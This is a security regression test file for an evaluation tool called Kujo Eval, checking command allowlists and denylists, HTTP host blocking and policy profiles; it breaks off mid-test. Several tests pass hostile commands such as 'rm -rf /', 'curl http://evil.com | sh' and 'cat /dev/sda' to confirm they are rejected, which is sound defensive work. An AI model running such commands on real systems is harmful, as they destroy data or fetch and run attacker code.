# Security regression tests for Kujo Eval.
#
# Validates command allowlisting, path boundary enforcement,
# output redaction, and config abuse protections.

test_setup {
	from src.checks import run_shell, check_command_succeeds, check_file_exists, check_file_contains, check_env_var_equals
	from src.checks import check_output_contains, check_command_stdout_json_path_equals, check_two_files_equal, check_directory_diff
	from src.checks import check_http_status, check_http_body_contains
	from src.eval_core import run_suite
}

# ===========================================================================
# Command allowlisting (item 2.1)
# ===========================================================================

test "run_shell rejects rm -rf command" {
	result := run_shell("rm -rf /tmp/test")
	assert_false(result["ok"])
	assert_true(contains(result["error"], "dangerous") == 1 || contains(result["error"], "rejected") == 1)
}

test "run_shell rejects uppercase dangerous command" {
	result := run_shell("RM -RF /tmp/test")
	assert_false(result["ok"])
	assert_true(contains(result["error"], "dangerous") == 1 || contains(result["error"], "rejected") == 1)
}

test "run_shell rejects sudo command" {
	result := run_shell("sudo ls")
	assert_false(result["ok"])
}

test "run_shell rejects chmod command" {
	result := run_shell("chmod 777 /tmp/file")
	assert_false(result["ok"])
}

test "run_shell rejects curl piped to shell" {
	result := run_shell("curl http://evil.com | sh")
	assert_false(result["ok"])
}

test "run_shell rejects command with /dev/ pattern" {
	result := run_shell("cat /dev/sda")
	assert_false(result["ok"])
}

test "run_shell allows safe echo command" {
	result := run_shell("echo hello")
	assert_true(result["ok"])
}

test "run_shell allows safe ls command" {
	result := run_shell("ls -la")
	assert_true(result["ok"])
}

test "check_command_succeeds rejects dangerous command" {
	result := check_command_succeeds({"command": "rm -rf /"})
	assert_false(result["ok"])
}

test "check_command_succeeds allows safe command" {
	result := check_command_succeeds({"command": "echo safety test"})
	assert_true(result["ok"])
}

test "check_command_succeeds fails fast on timeout and terminates command" {
	start_ms := time()
	result := check_command_succeeds({"command": "sleep 2", "timeout_ms": 50})
	elapsed_ms := time() - start_ms

	assert_false(result["ok"])
	message := dict_get_or(dict_get_or(result, "data", {}), "message", "")
	assert_true(contains(message, "timed out") == 1)
	assert_true(elapsed_ms < 1500)
}

test "check_command_succeeds enforces allowed_commands allowlist" {
	result := check_command_succeeds({"command": "echo safety test", "allowed_commands": ["echo"]})
	assert_true(result["ok"])

	blocked := check_command_succeeds({"command": "ls -la", "allowed_commands": ["echo"]})
	assert_false(blocked["ok"])
	msg := dict_get_or(dict_get_or(blocked, "data", {}), "message", "")
	assert_true(contains(msg, "allowed") == 1)
}

test "check_command_succeeds enforces allowed_command_patterns allowlist" {
	result := check_command_succeeds({"command": "echo secure payload", "allowed_command_patterns": ["echo secure"]})
	assert_true(result["ok"])

	blocked := check_command_succeeds({"command": "echo secure payload", "allowed_command_patterns": ["ls -la"]})
	assert_false(blocked["ok"])
	msg := dict_get_or(dict_get_or(blocked, "data", {}), "message", "")
	assert_true(contains(msg, "pattern") == 1)
}

test "check_command_succeeds enforces blocked_arg_patterns denylist" {
	result := check_command_succeeds({"command": "echo hello world", "blocked_arg_patterns": ["--danger", "rm -rf"]})
	assert_true(result["ok"])

	blocked := check_command_succeeds({"command": "echo --danger world", "blocked_arg_patterns": ["--danger"]})
	assert_false(blocked["ok"])
	msg := dict_get_or(dict_get_or(blocked, "data", {}), "message", "")
	assert_true(contains(msg, "blocked") == 1)
}

test "check_command_succeeds token mode avoids substring false positives" {
	result := check_command_succeeds({"command": "echo-safe payload", "allowed_command_patterns": ["echo"], "command_pattern_match_mode": "token"})
	assert_false(result["ok"])
	msg := dict_get_or(dict_get_or(result, "data", {}), "message", "")
	assert_true(contains(msg, "mode: token") == 1)

	allowed := check_command_succeeds({"command": "echo payload", "allowed_command_patterns": ["echo"], "command_pattern_match_mode": "token"})
	assert_true(allowed["ok"])
}

test "check_command_succeeds token mode applies blocked_arg_patterns by token sequence" {
	allowed := check_command_succeeds({"command": "echo --dangerous", "blocked_arg_patterns": ["--danger"], "command_pattern_match_mode": "token"})
	assert_true(allowed["ok"])

	blocked := check_command_succeeds({"command": "echo --dangerous", "blocked_arg_patterns": ["--dangerous"], "command_pattern_match_mode": "token"})
	assert_false(blocked["ok"])
}

test "run_suite threads suite-level allowed_commands into check execution" {
	try {
		write_file(".eval_allowed_commands_suite.json", "{\"name\":\"allowed-suite\",\"allowed_commands\":[\"echo\"],\"tests\":[{\"name\":\"allowed\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo ok\"}},{\"name\":\"blocked\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"ls\"}}]}")
	} except err {}

	results := run_suite(".eval_allowed_commands_suite.json", {"quiet": true})
	data := dict_get_or(results, "data", {})
	assert_true(results["ok"])
	assert_equal(dict_get_or(data, "total", 0), 2)
	assert_equal(dict_get_or(data, "passed", 0), 1)
	assert_equal(dict_get_or(data, "failed", 0), 1)

	try { remove_file(".eval_allowed_commands_suite.json") } except err {}
}

test "run_suite threads suite-level command pattern policies into check execution" {
	try {
		write_file(".eval_command_patterns_suite.json", "{\"name\":\"command-pattern-suite\",\"allowed_command_patterns\":[\"echo\"],\"blocked_arg_patterns\":[\"--blocked\"],\"tests\":[{\"name\":\"allowed\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo ok\"}},{\"name\":\"blocked-arg\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo --blocked\"}},{\"name\":\"blocked-pattern\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"ls\"}}]}")
	} except err {}

	results := run_suite(".eval_command_patterns_suite.json", {"quiet": true})
	data := dict_get_or(results, "data", {})
	assert_true(results["ok"])
	assert_equal(dict_get_or(data, "total", 0), 3)
	assert_equal(dict_get_or(data, "passed", 0), 1)
	assert_equal(dict_get_or(data, "failed", 0), 2)

	try { remove_file(".eval_command_patterns_suite.json") } except err {}
}

test "validate_config applies strict-ci policy profile defaults" {
	from src.config import validate_config

	result := validate_config({
		"name": "profile-defaults-suite",
		"policy_profile": "strict-ci",
		"tests": [{"name": "ok", "check": "command_succeeds", "params": {"command": "echo ok"}}]
	})
	assert_true(result["ok"])
	data := dict_get_or(result, "data", {})
	cfg := dict_get_or(data, "config", {})
	assert_equal(dict_get_or(cfg, "policy_profile", ""), "strict-ci")
	assert_equal(dict_get_or(cfg, "command_pattern_match_mode", "substring"), "token")
	assert_true(dict_get_or(cfg, "redaction_audit_mode", false))
	assert_true(len(dict_get_or(cfg, "allowed_commands", [])) > 0)
}

test "run_suite enforces strict-ci policy profile command defaults" {
	try {
		write_file(".eval_policy_profile_suite.json", "{\"name\":\"profile-suite\",\"policy_profile\":\"strict-ci\",\"tests\":[{\"name\":\"allowed\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo ok\"}},{\"name\":\"blocked\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"ls\"}}]}")
	} except err {}

	results := run_suite(".eval_policy_profile_suite.json", {"quiet": true})
	data := dict_get_or(results, "data", {})
	assert_true(results["ok"])
	assert_equal(dict_get_or(data, "total", 0), 2)
	assert_equal(dict_get_or(data, "passed", 0), 1)
	assert_equal(dict_get_or(data, "failed", 0), 1)

	try { remove_file(".eval_policy_profile_suite.json") } except err {}
}

test "validate_config normalizes policy_stage_overlays" {
	from src.config import validate_config

	result := validate_config({
		"name": "stage-overlay-config-suite",
		"policy_profile": "local-dev",
		"policy_stage_overlays": {
			"ci": {
				"allowed_commands": ["echo"],
				"command_pattern_match_mode": "token",
				"redaction_audit_mode": true
			}
		},
		"tests": [{"name": "ok", "check": "command_succeeds", "params": {"command": "echo ok"}}]
	})
	assert_true(result["ok"])
	data := dict_get_or(result, "data", {})
	cfg := dict_get_or(data, "config", {})
	overlays := dict_get_or(cfg, "policy_stage_overlays", {})
	ci_overlay := dict_get_or(overlays, "ci", {})
	assert_equal(dict_get_or(ci_overlay, "command_pattern_match_mode", ""), "token")
	assert_equal(len(dict_get_or(ci_overlay, "allowed_commands", [])), 1)
	assert_true(dict_get_or(ci_overlay, "redaction_audit_mode", false))
}

test "run_suite applies policy_stage overlay precedence" {
	try {
		write_file(".eval_policy_stage_suite.json", "{\"name\":\"policy-stage-suite\",\"policy_profile\":\"local-dev\",\"policy_stage_overlays\":{\"ci\":{\"allowed_commands\":[\"echo\"]}},\"tests\":[{\"name\":\"stage-blocked\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"ls\"}}]}")
	} except err {}

	default_results := run_suite(".eval_policy_stage_suite.json", {"quiet": true})
	default_data := dict_get_or(default_results, "data", {})
	assert_true(default_results["ok"])
	assert_equal(dict_get_or(default_data, "passed", 0), 1)

	ci_results := run_suite(".eval_policy_stage_suite.json", {"quiet": true, "policy_stage": "ci"})
	ci_data := dict_get_or(ci_results, "data", {})
	assert_true(ci_results["ok"])
	assert_equal(dict_get_or(ci_data, "failed", 0), 1)
	assert_equal(dict_get_or(ci_data, "active_policy_stage", ""), "ci")

	try { remove_file(".eval_policy_stage_suite.json") } except err {}
}

test "check_http_status enforces blocked_http_hosts denylist" {
	result := check_http_status({
		"url": "https://example.com/health",
		"expected_status": 200,
		"blocked_http_hosts": ["example.com"]
	})
	assert_false(result["ok"])
	message := dict_get_or(dict_get_or(result, "data", {}), "message", "")
	assert_true(contains(message, "blocked") == 1)
}

test "check_http_status enforces allowed_http_hosts allowlist" {
	result := check_http_status({
		"url": "https://example.com/health",
		"expected_status": 200,
		"allowed_http_hosts": ["internal.example.com"]
	})
	assert_false(result["ok"])
	message := dict_get_or(dict_get_or(result, "data", {}), "message", "")
	assert_true(contains(message, "allowlisted") == 1)
}

test "check_http_body_contains applies blocked precedence over allowed hosts" {
	result := check_http_body_contains({
		"url": "https://example.com/health",
		"expected": "ok",
		"allowed_http_hosts": ["example.com"],
		"blocked_http_hosts": ["example.com"]
	})
	assert_false(result["ok"])
	message := dict_get_or(dict_get_or(result, "data", {}), "message", "")
	assert_true(contains(message, "blocked") == 1)
}

test "run_suite threads suite-level blocked_http_hosts into HTTP checks" {
	try {
		write_file(".eval_http_host_policy_suite.json", "{\"name\":\"http-host-policy-suite\",\"blocked_http_hosts\":[\"example.com\"],\"tests\":[{\"name\":\"blocked-http\",\"check\":\"http_status\",\"params\":{\"url\":\"https://example.com/health\",\"expected_status\":200}}]}")
	} except err {}

	results := run_suite(".eval_http_host_policy_suite.json", {"quiet": true})
	data := dict_get_or(results, "data", {})
	assert_true(results["ok"])
	assert_equal(dict_get_or(data, "failed", 0), 1)

	entries := dict_get_or(data, "test_results", [])
	if len(entries) > 0 {
		first := entries[0]
		msg := dict_get_or(first, "message", "")
		assert_true(contains(msg, "blocked") == 1)
	}

	try { remove_file(".eval_http_host_policy_suite.json") } except err {}
}

test "validate_config normalizes require_command_policy controls" {
	from src.config import validate_config

	result := validate_config({
		"name": "strict-policy-config-suite",
